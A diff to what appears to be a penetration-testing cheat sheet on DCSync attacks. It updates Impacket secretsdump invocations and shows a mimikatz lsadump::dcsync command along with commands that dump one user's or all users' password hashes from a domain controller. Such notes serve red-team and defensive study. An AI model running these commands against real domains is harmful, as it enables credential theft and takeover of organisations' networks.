@@ -39,11 +39,11 @@ mimikatz "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /controller:$DC_IP"
 ```
 
 - `/controller`: Specifies the domain controller to sync with for hashes.
-## Impacket's `secretsdump.py`
+## Impacket's `secretsdump`
 ### Basic Usage
 
 ```bash
-secretsdump $DOMAIN/$USER:$PASSWORD@$IP -just-dc-user $TARGET_USER
+impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP -just-dc-user $TARGET_USER
 ```
 
 - `$DOMAIN/$USER:$PASSWORD`: The attacker’s credentials (could also use NTLM hash).    
@@ -53,7 +53,7 @@ secretsdump $DOMAIN/$USER:$PASSWORD@$IP -just-dc-user $TARGET_USER
 #### Extract All User Hashes
 
 ```bash
-secretsdump.py $DOMAIN/$USER:$PASSWORD@$IP -outputfile hashes.txt
+impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP -outputfile hashes.txt
 ```
 
 - This command will dump all user hashes from the domain controller. 
